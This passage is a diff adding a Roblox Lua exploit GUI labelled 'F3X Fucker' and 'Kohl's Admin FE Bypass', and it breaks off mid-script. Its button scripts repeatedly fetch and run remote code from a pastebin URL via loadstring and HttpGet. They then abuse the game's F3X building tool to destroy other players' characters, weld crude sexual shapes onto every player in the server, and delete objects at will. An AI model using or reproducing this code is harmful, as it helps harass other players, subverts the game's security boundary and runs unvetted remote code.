+Inject.Position = UDim2.new(0.109999999, 3, 0.197278902, 132)
+Inject.Size = UDim2.new(0.766666651, -3, 0, 30)
+Inject.ZIndex = 2
+Inject.Font = Enum.Font.SourceSans
+Inject.Text = "Inject (must use cmd help to inject)"
+Inject.TextColor3 = Color3.fromRGB(255, 255, 255)
+Inject.TextSize = 14.000
+Inject.TextWrapped = true
+
+Title_14.Name = "Title"
+Title_14.Parent = KohlsAdmin
+Title_14.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_14.BorderSizePixel = 3
+Title_14.Size = UDim2.new(1, 0, 0, 30)
+Title_14.ZIndex = 2
+Title_14.Font = Enum.Font.SourceSansBold
+Title_14.Text = "Kohl's Admin \"FE Bypass\""
+Title_14.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_14.TextSize = 14.000
+
+cmds.Name = "cmds"
+cmds.Parent = KohlsAdmin
+cmds.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+cmds.BorderColor3 = Color3.fromRGB(255, 0, 0)
+cmds.BorderSizePixel = 3
+cmds.Position = UDim2.new(0.119999997, 0, 0.193877548, 0)
+cmds.Size = UDim2.new(0.75, 1, 0.173469394, -1)
+cmds.ZIndex = 2
+cmds.Font = Enum.Font.SourceSans
+cmds.PlaceholderText = "-- cmds"
+cmds.Text = ""
+cmds.TextColor3 = Color3.fromRGB(255, 255, 255)
+cmds.TextSize = 14.000
+
+ExecuteCmd.Name = "Execute Cmd"
+ExecuteCmd.Parent = KohlsAdmin
+ExecuteCmd.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ExecuteCmd.BorderColor3 = Color3.fromRGB(255, 0, 0)
+ExecuteCmd.BorderSizePixel = 3
+ExecuteCmd.Position = UDim2.new(0.109999985, 3, 0.333333343, 132)
+ExecuteCmd.Size = UDim2.new(0.400000036, -3, 0, 30)
+ExecuteCmd.ZIndex = 2
+ExecuteCmd.Font = Enum.Font.SourceSans
+ExecuteCmd.Text = "Execute Cmd"
+ExecuteCmd.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteCmd.TextSize = 14.000
+ExecuteCmd.TextWrapped = true
+
+ExecuteFunction.Name = "Execute Function"
+ExecuteFunction.Parent = KohlsAdmin
+ExecuteFunction.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ExecuteFunction.BorderColor3 = Color3.fromRGB(255, 0, 0)
+ExecuteFunction.BorderSizePixel = 3
+ExecuteFunction.Position = UDim2.new(0.5, 3, 0.333333343, 132)
+ExecuteFunction.Size = UDim2.new(0.376666665, -3, 0, 30)
+ExecuteFunction.ZIndex = 2
+ExecuteFunction.Font = Enum.Font.SourceSans
+ExecuteFunction.Text = "Execute Function"
+ExecuteFunction.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteFunction.TextSize = 14.000
+ExecuteFunction.TextWrapped = true
+
+functions.Name = "functions"
+functions.Parent = KohlsAdmin
+functions.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+functions.BorderColor3 = Color3.fromRGB(255, 0, 0)
+functions.BorderSizePixel = 3
+functions.Position = UDim2.new(0.123333327, 0, 0.421768725, 0)
+functions.Size = UDim2.new(0.75, 1, 0.173469394, -1)
+functions.ZIndex = 2
+functions.Font = Enum.Font.SourceSans
+functions.PlaceholderText = "-- functions"
+functions.Text = ""
+functions.TextColor3 = Color3.fromRGB(255, 255, 255)
+functions.TextSize = 14.000
+
+Title_15.Name = "Title"
+Title_15.Parent = Page2
+Title_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_15.BorderSizePixel = 3
+Title_15.Position = UDim2.new(-0.0011353048, 0, 0.931670547, 0)
+Title_15.Size = UDim2.new(1.00113535, 0, -0.0340136066, 30)
+Title_15.ZIndex = 2
+Title_15.Font = Enum.Font.SourceSansBold
+Title_15.Text = "Page 2"
+Title_15.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_15.TextSize = 14.000
+
+SettingsButton_2.Name = "SettingsButton"
+SettingsButton_2.Parent = Frame
+SettingsButton_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SettingsButton_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SettingsButton_2.BorderSizePixel = 3
+SettingsButton_2.Position = UDim2.new(1, 3, 0, 0)
+SettingsButton_2.Size = UDim2.new(0, 27, 1, 0)
+SettingsButton_2.Visible = false
+SettingsButton_2.Font = Enum.Font.SourceSans
+SettingsButton_2.Text = ">"
+SettingsButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+SettingsButton_2.TextSize = 48.000
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = c00lgui
+CloseOpen.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+CloseOpen.BorderColor3 = Color3.fromRGB(255, 0, 0)
+CloseOpen.BorderSizePixel = 3
+CloseOpen.Position = UDim2.new(0, 3, 0.300000012, 380)
+CloseOpen.Size = UDim2.new(0, 300, 0, 20)
+CloseOpen.ZIndex = 3
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "Close"
+CloseOpen.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
+CloseOpen.TextSize = 18.000
+
+-- Scripts:
+
+local function HWMLMUE_fake_script() -- TrollingGUI.LocalScript 
+	local script = Instance.new('LocalScript', TrollingGUI)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		-- Instances:
+	
+		local aww = Instance.new("ScreenGui")
+		local Main = Instance.new("Frame")
+		local Frame = Instance.new("ImageLabel")
+		local Frame_2 = Instance.new("ImageLabel")
+		local TextLabel = Instance.new("TextLabel")
+		local TextLabel_2 = Instance.new("TextLabel")
+		local Page1 = Instance.new("Frame")
+		local Car = Instance.new("TextButton")
+		local Adonis = Instance.new("TextButton")
+		local Kazoo = Instance.new("TextButton")
+		local InfiniteYield = Instance.new("TextButton")
+		local JaneDoe = Instance.new("TextButton")
+		local Felipe = Instance.new("TextButton")
+		local ThanosBoss = Instance.new("TextButton")
+		local LavaKnife = Instance.new("TextButton")
+		local JohnDoe = Instance.new("TextButton")
+		local NootNoot = Instance.new("TextButton")
+		local DEX = Instance.new("TextButton")
+		local Weed = Instance.new("TextButton")
+		local TextBox = Instance.new("TextBox")
+		local TextButton = Instance.new("TextButton")
+		local _1 = Instance.new("TextButton")
+		local re = Instance.new("TextButton")
+	
+		--Properties:
+	
+		aww.Name = "aww"
+		aww.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+		aww.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		aww.ResetOnSpawn = false
+	
+		Main.Name = "Main"
+		Main.Parent = aww
+		Main.Active = true
+		Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Main.BackgroundTransparency = 1.000
+		Main.Position = UDim2.new(0.470512867, 0, 0.259890139, 0)
+		Main.Size = UDim2.new(0, 479, 0, 298)
+	
+		Frame.Name = "Frame"
+		Frame.Parent = Main
+		Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Frame.BackgroundTransparency = 1.000
+		Frame.Position = UDim2.new(0, 0, -0.000749831204, 0)
+		Frame.Size = UDim2.new(0, 479, 0, 298)
+		Frame.Image = "rbxassetid://3570695787"
+		Frame.ImageColor3 = Color3.fromRGB(90, 90, 90)
+		Frame.ScaleType = Enum.ScaleType.Slice
+		Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+		Frame.SliceScale = 0.120
+	
+		Frame_2.Name = "Frame"
+		Frame_2.Parent = Main
+		Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Frame_2.BackgroundTransparency = 1.000
+		Frame_2.Position = UDim2.new(0, 0, -0.00156105601, 0)
+		Frame_2.Size = UDim2.new(0, 479, 0, 34)
+		Frame_2.Image = "rbxassetid://3570695787"
+		Frame_2.ImageColor3 = Color3.fromRGB(102, 102, 102)
+		Frame_2.ScaleType = Enum.ScaleType.Slice
+		Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
+		Frame_2.SliceScale = 0.120
+	
+		TextLabel.Parent = Frame_2
+		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel.BackgroundTransparency = 1.000
+		TextLabel.Position = UDim2.new(0.191776156, 0, 0, 0)
+		TextLabel.Size = UDim2.new(0, 294, 0, 20)
+		TextLabel.Font = Enum.Font.SourceSansBold
+		TextLabel.Text = "F3X Fucker"
+		TextLabel.TextColor3 = Color3.fromRGB(143, 0, 0)
+		TextLabel.TextSize = 26.000
+		TextLabel.TextWrapped = true
+	
+		TextLabel_2.Parent = Frame_2
+		TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_2.BackgroundTransparency = 1.000
+		TextLabel_2.Position = UDim2.new(0.315173328, 0, 0.511764526, 0)
+		TextLabel_2.Size = UDim2.new(0, 174, 0, 16)
+		TextLabel_2.Font = Enum.Font.ArialBold
+		TextLabel_2.Text = "By I DONT KNOW BUT I MADE IT :("
+		TextLabel_2.TextColor3 = Color3.fromRGB(131, 0, 0)
+		TextLabel_2.TextSize = 15.000
+	
+		Page1.Name = "Page1"
+		Page1.Parent = Main
+		Page1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Page1.BackgroundTransparency = 1.000
+		Page1.Position = UDim2.new(0, 0, 0.110738255, 0)
+		Page1.Size = UDim2.new(0, 478, 0, 264)
+	
+		Car.Name = "Car"
+		Car.Parent = Page1
+		Car.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		Car.BorderSizePixel = 0
+		Car.Position = UDim2.new(0.031380754, 0, 0.11363636, 0)
+		Car.Size = UDim2.new(0, 99, 0, 47)
+		Car.Font = Enum.Font.ArialBold
+		Car.Text = "Knife"
+		Car.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Car.TextSize = 14.000
+		Car.TextWrapped = true
+	
+		Adonis.Name = "Adonis"
+		Adonis.Parent = Page1
+		Adonis.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		Adonis.BorderSizePixel = 0
+		Adonis.Position = UDim2.new(0.031380754, 0, 0.344696999, 0)
+		Adonis.Size = UDim2.new(0, 99, 0, 47)
+		Adonis.Font = Enum.Font.ArialBold
+		Adonis.Text = "Remove Walking"
+		Adonis.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Adonis.TextSize = 14.000
+		Adonis.TextWrapped = true
+	
+		Kazoo.Name = "Kazoo"
+		Kazoo.Parent = Page1
+		Kazoo.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		Kazoo.BorderSizePixel = 0
+		Kazoo.Position = UDim2.new(0.0292887036, 0, 0.583333313, 0)
+		Kazoo.Size = UDim2.new(0, 99, 0, 47)
+		Kazoo.Font = Enum.Font.ArialBold
+		Kazoo.Text = "W.I.P"
+		Kazoo.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Kazoo.TextSize = 14.000
+		Kazoo.TextWrapped = true
+	
+		InfiniteYield.Name = "Infinite Yield"
+		InfiniteYield.Parent = Page1
+		InfiniteYield.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		InfiniteYield.BorderSizePixel = 0
+		InfiniteYield.Position = UDim2.new(0.274058551, 0, 0.583333313, 0)
+		InfiniteYield.Size = UDim2.new(0, 99, 0, 47)
+		InfiniteYield.Font = Enum.Font.ArialBold
+		InfiniteYield.Text = "W.I.P"
+		InfiniteYield.TextColor3 = Color3.fromRGB(255, 255, 255)
+		InfiniteYield.TextSize = 14.000
+		InfiniteYield.TextWrapped = true
+	
+		JaneDoe.Name = "Jane Doe"
+		JaneDoe.Parent = Page1
+		JaneDoe.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		JaneDoe.BorderSizePixel = 0
+		JaneDoe.Position = UDim2.new(0.518828452, 0, 0.583333313, 0)
+		JaneDoe.Size = UDim2.new(0, 99, 0, 47)
+		JaneDoe.Font = Enum.Font.ArialBold
+		JaneDoe.Text = "W.I.P"
+		JaneDoe.TextColor3 = Color3.fromRGB(255, 255, 255)
+		JaneDoe.TextSize = 14.000
+		JaneDoe.TextWrapped = true
+	
+		Felipe.Name = "Felipe"
+		Felipe.Parent = Page1
+		Felipe.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		Felipe.BorderSizePixel = 0
+		Felipe.Position = UDim2.new(0.761506259, 0, 0.583333313, 0)
+		Felipe.Size = UDim2.new(0, 99, 0, 47)
+		Felipe.Font = Enum.Font.ArialBold
+		Felipe.Text = "W.I.P"
+		Felipe.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Felipe.TextSize = 14.000
+		Felipe.TextWrapped = true
+	
+		ThanosBoss.Name = "Thanos Boss"
+		ThanosBoss.Parent = Page1
+		ThanosBoss.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		ThanosBoss.BorderSizePixel = 0
+		ThanosBoss.Position = UDim2.new(0.274058551, 0, 0.344696939, 0)
+		ThanosBoss.Size = UDim2.new(0, 99, 0, 47)
+		ThanosBoss.Font = Enum.Font.ArialBold
+		ThanosBoss.Text = "Sex"
+		ThanosBoss.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ThanosBoss.TextSize = 14.000
+		ThanosBoss.TextWrapped = true
+	
+		LavaKnife.Name = "Lava Knife"
+		LavaKnife.Parent = Page1
+		LavaKnife.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		LavaKnife.BorderSizePixel = 0
+		LavaKnife.Position = UDim2.new(0.518828452, 0, 0.344696939, 0)
+		LavaKnife.Size = UDim2.new(0, 99, 0, 47)
+		LavaKnife.Font = Enum.Font.ArialBold
+		LavaKnife.Text = "W.I.P"
+		LavaKnife.TextColor3 = Color3.fromRGB(255, 255, 255)
+		LavaKnife.TextSize = 14.000
+		LavaKnife.TextWrapped = true
+	
+		JohnDoe.Name = "John Doe"
+		JohnDoe.Parent = Page1
+		JohnDoe.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		JohnDoe.BorderSizePixel = 0
+		JohnDoe.Position = UDim2.new(0.761506259, 0, 0.344696939, 0)
+		JohnDoe.Size = UDim2.new(0, 99, 0, 47)
+		JohnDoe.Font = Enum.Font.ArialBold
+		JohnDoe.Text = "W.I.P"
+		JohnDoe.TextColor3 = Color3.fromRGB(255, 255, 255)
+		JohnDoe.TextSize = 14.000
+		JohnDoe.TextWrapped = true
+	
+		NootNoot.Name = "Noot Noot"
+		NootNoot.Parent = Page1
+		NootNoot.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		NootNoot.BorderSizePixel = 0
+		NootNoot.Position = UDim2.new(0.274058551, 0, 0.113636345, 0)
+		NootNoot.Size = UDim2.new(0, 99, 0, 47)
+		NootNoot.Font = Enum.Font.ArialBold
+		NootNoot.Text = "Hammer"
+		NootNoot.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NootNoot.TextSize = 14.000
+		NootNoot.TextWrapped = true
+	
+		DEX.Name = "DEX"
+		DEX.Parent = Page1
+		DEX.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		DEX.BorderSizePixel = 0
+		DEX.Position = UDim2.new(0.518828452, 0, 0.113636345, 0)
+		DEX.Size = UDim2.new(0, 99, 0, 47)
+		DEX.Font = Enum.Font.ArialBold
+		DEX.Text = "Stummy Guns"
+		DEX.TextColor3 = Color3.fromRGB(255, 255, 255)
+		DEX.TextSize = 14.000
+		DEX.TextWrapped = true
+	
+		Weed.Name = "Weed"
+		Weed.Parent = Page1
+		Weed.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		Weed.BorderSizePixel = 0
+		Weed.Position = UDim2.new(0.761506259, 0, 0.113636345, 0)
+		Weed.Size = UDim2.new(0, 99, 0, 47)
+		Weed.Font = Enum.Font.ArialBold
+		Weed.Text = "Ro-Xploit All"
+		Weed.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Weed.TextSize = 14.000
+		Weed.TextWrapped = true
+	
+		TextBox.Parent = Main
+		TextBox.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		TextBox.BorderSizePixel = 0
+		TextBox.Position = UDim2.new(0.031315241, 0, 0.825503349, 0)
+		TextBox.Size = UDim2.new(0, 448, 0, 43)
+		TextBox.Font = Enum.Font.ArialBold
+		TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+		TextBox.PlaceholderText = "me"
+		TextBox.ShowNativeInput = false
+		TextBox.Text = "me"
+		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+		TextBox.TextSize = 14.000
+	
+		TextButton.Parent = Main
+		TextButton.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		TextButton.BorderColor3 = Color3.fromRGB(56, 16, 255)
+		TextButton.BorderSizePixel = 0
+		TextButton.Position = UDim2.new(0.909803629, 0, 0.0226420462, 0)
+		TextButton.Size = UDim2.new(0, 35, 0, 19)
+		TextButton.Font = Enum.Font.ArialBold
+		TextButton.Text = "X"
+		TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton.TextSize = 14.000
+	
+		_1.Name = "1"
+		_1.Parent = Main
+		_1.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		_1.BorderSizePixel = 0
+		_1.Position = UDim2.new(0.121085592, 0, 0.126668841, 0)
+		_1.Size = UDim2.new(0, 405, 0, 19)
+		_1.Font = Enum.Font.ArialBold
+		_1.Text = "1"
+		_1.TextColor3 = Color3.fromRGB(255, 255, 255)
+		_1.TextSize = 14.000
+	
+		re.Name = "re"
+		re.Parent = Main
+		re.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+		re.BorderColor3 = Color3.fromRGB(56, 16, 255)
+		re.BorderSizePixel = 0
+		re.Position = UDim2.new(0.0298982859, 0, 0.123467684, 0)
+		re.Size = UDim2.new(0, 35, 0, 19)
+		re.Font = Enum.Font.ArialBold
+		re.Text = "RE"
+		re.TextColor3 = Color3.fromRGB(255, 255, 255)
+		re.TextSize = 14.000
+	
+		-- Scripts:
+	
+		local function RTUIL_fake_script() -- Car.Script 
+			local script = Instance.new('Script', Car)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				player = game.Players.LocalPlayer
+				--keybiard=H
+				Tool0 = Instance.new("Tool")
+				Part1 = Instance.new("Part",Part)
+	
+				Tool0.Parent = player.Backpack
+				Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+				Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+				Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+				Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+				Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+				Part1.Name = "Handle"
+				Part1.Parent = Tool0
+				Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+				Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+				Part1.Size = Vector3.new(0,0,0)
+				Part1.BottomSurface = Enum.SurfaceType.Smooth
+				Part1.TopSurface = Enum.SurfaceType.Smooth
+				local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+	
+				local part = F3X.new("Part", workspace)
+				part.CanCollide = true
+				part.Size = Vector3.new(0.00005, 0.00005, 0.000005)
+				part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(11,0,0) 
+				wait()
+				part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+				local mesh = part:AddMesh()
+				mesh.MeshId = "rbxassetid://121944778"
+				mesh.TextureId = "rbxassetid://121944805"
+				mesh.Scale = Vector3.new(1, 1, 1)
+	
+				game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+				local key = game:GetService("UserInputService")
+	
+				key.InputBegan:Connect(function(input)
+					if input.KeyCode == Enum.KeyCode.H then
+						game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+						wait(0.35)
+						game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+					end
+				end)
+	
+				local key = game:GetService("UserInputService")
+	
+				key.InputBegan:Connect(function(input)
+					if input.KeyCode == Enum.KeyCode.H then
+						game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+						wait(0.35)
+						game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+						wait(0.35)
+						game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+					end
+				end)
+			end)
+		end
+		coroutine.wrap(RTUIL_fake_script)()
+		local function APRH_fake_script() -- Adonis.Script 
+			local script = Instance.new('Script', Adonis)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+				for _,player in pairs(game.Players:GetPlayers()) do
+					spawn(function()
+						F3X.Edit(player.Character:GetChildren(), {})
+	
+						F3X.Object(player.Character.HumanoidRootPart):Destroy()
+	
+	
+					end)
+				end
+			end)
+		end
+		coroutine.wrap(APRH_fake_script)()
+		local function AHCF_fake_script() -- ThanosBoss.Script 
+			local script = Instance.new('Script', ThanosBoss)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+				for _,player in pairs(game.Players:GetPlayers()) do
+					spawn(function()
+						F3X.Edit(player.Character:GetChildren(), {})
+	
+						local part = F3X.new("Part", workspace)
+						part.CanCollide = false
+						part.BrickColor = BrickColor.new(176)
+						part.Material = ("Smooth Plwwastic")
+						part.Size = Vector3.new(0.8, 0.8, 3)
+						part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -2)
+						wait()
+						part:WeldTo(player.Character.HumanoidRootPart)
+	
+						local part2 = F3X.new("Ball", workspace)
+						part2.CanCollide = false
+						part2.BrickColor = BrickColor.new(176)
+						part2.Material = ("Smooth Plastic")
+						part2.Size = Vector3.new(1, 1, 4)
+						part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, -0.5, -1)
+						wait()
+						part2:WeldTo(player.Character.HumanoidRootPart)
+	
+						local part3 = F3X.new("Ball", workspace)
+						part3.CanCollide = false
+						part3.Material = ("Smooth Plastic")
+						part3.BrickColor = BrickColor.new(22)
+						part3.Size = Vector3.new(1, 1, 3)
+						part3.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -3.5)
+						wait()
+						part3:WeldTo(player.Character.HumanoidRootPart)
+						local part1 = F3X.new("Ball", workspace)
+						part1.CanCollide = false
+						part1.BrickColor = BrickColor.new(176)
+						part1.Material = ("Smooth Plastic")
+						part1.Size = Vector3.new(1, 1, 4)
+						part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, -0.5, -1)
+						wait()
+	
+						part1:WeldTo(player.Character.HumanoidRootPart)
+	
+					end)
+	
+				end
+			end)
+		end
+		coroutine.wrap(AHCF_fake_script)()
+		local function IBJH_fake_script() -- NootNoot.Script 
+			local script = Instance.new('Script', NootNoot)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				player = game.Players.LocalPlayer
+	
+	
+	
+				local tool3 = Instance.new("HopperBin") --Gives the player a destroy tool.
+				tool3.Parent = player.Backpack
+				tool3.Name = "Delete"
+				tool3.BinType = "Script"
+				tool3.TextureId = "http://www.roblox.com/asset/?id=19681474"
+				print("Gave delete tool")
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+				--Functions--
+	
+	
+	
+	
+	
+				function destroy()
+					playerMouse = game.Players.LocalPlayer:GetMouse()
+					local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+					F3X.Object(playerMouse.Target):Destroy()
+				end
+	
+	
+				------------------------
+	
+				--Events-
+	
+	
+	
+	
+	
+	
+				tool3.Selected:connect(function(mouse)
+					print("Selected.")
+					mouse.Button1Down:connect(destroy)
+				end)
+	
+	
+			end)
+		end
+		coroutine.wrap(IBJH_fake_script)()
+		local function VZHMRE_fake_script() -- DEX.Script 
+			local script = Instance.new('Script', DEX)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				player = game.Players.LocalPlayer
+	
+				Tool0 = Instance.new("Tool")
+				Part1 = Instance.new("Part")
+	
+				Tool0.Parent = player.Backpack
+				Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+				Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+				Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+				Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+				Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+				Part1.Name = "Handle"
+				Part1.Parent = Tool0
+				Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+				Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+				Part1.Size = Vector3.new(0,0,0)
+				Part1.BottomSurface = Enum.SurfaceType.Smooth
+				Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+				local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+				local part = F3X.new("Part", workspace)
+	
+				part.Locked = true
+				part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+				part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,0, -1.85)  wait()
+				part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+				local duck = part:AddMesh()
+				duck.MeshId = "http://www.roblox.com/asset/?id=94219391"
+				duck.TextureId = "http://www.roblox.com/asset/?id=94219470"
+	
+				duck.Scale = Vector3.new(2, 2, 2)
+	
+				game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+			end)
+		end
+		coroutine.wrap(VZHMRE_fake_script)()
+		local function RGSU_fake_script() -- Weed.Script 
+			local script = Instance.new('Script', Weed)
+	
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+				for _,player in pairs(game:GetService("Players"):GetChildren()) do
+					spawn(function()
+						F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+						for _,limb in pairs(player.Character:GetChildren()) do
+							if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+								F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+							end
+						end
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+	
+						part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, -0.6)    wait()
+						part:WeldTo(player.Character["Head"])
+						F3X.Object(player.Character["Head"]).Transparency = 1
+						local lol = part:AddMesh()
+						lol.MeshId = "http://www.roblox.com/asset/?id=935471144"
+						lol.TextureId = "http://www.roblox.com/asset/?id=935471150"
+						lol.Scale = Vector3.new(0.05, 0.05, 0.05)
+					end)
+				end
+	
+			end)
+		end
+		coroutine.wrap(RGSU_fake_script)()
+		local function HWFD_fake_script() -- TextButton.Script 
+			local script = Instance.new('Script', TextButton)
+	
+			button = script.Parent
+			window = script.Parent.Parent 
+	
+			function onClicked(GUI)
+				window:remove()
+			end
+			script.Parent.MouseButton1Click:connect(onClicked)
+		end
+		coroutine.wrap(HWFD_fake_script)()
+		local function GEDV_fake_script() -- Main.Dragify 
+			local script = Instance.new('LocalScript', Main)
+	
+			local UIS = game:GetService("UserInputService")
+			function dragify(Frame)
+				dragToggle = nil
+				local dragSpeed = 0
+				dragInput = nil
+				dragStart = nil
+				local dragPos = nil
+				function updateInput(input)
+					local Delta = input.Position - dragStart
+					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+					game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+				end
+				Frame.InputBegan:Connect(function(input)
+					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+						dragToggle = true
+						dragStart = input.Position
+						startPos = Frame.Position
+						input.Changed:Connect(function()
+							if input.UserInputState == Enum.UserInputState.End then
+								dragToggle = false
+							end
+						end)
+					end
+				end)
+				Frame.InputChanged:Connect(function(input)
+					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+						dragInput = input
+					end
+				end)
+				game:GetService("UserInputService").InputChanged:Connect(function(input)
+					if input == dragInput and dragToggle then
+						updateInput(input)
+					end
+				end)
+			end
+	
+			dragify(script.Parent)
+		end
+		coroutine.wrap(GEDV_fake_script)()
+		local function QPEGI_fake_script() -- _1.LocalScript 
+			local script = Instance.new('LocalScript', _1)
+	
+			script.Parent.MouseButton1Down:connect(function()
+				script.Parent.Parent.Page2.Visible = false
+				script.Parent.Parent.Page3.Visible = false
+				script.Parent.Parent.Page4.Visible = false
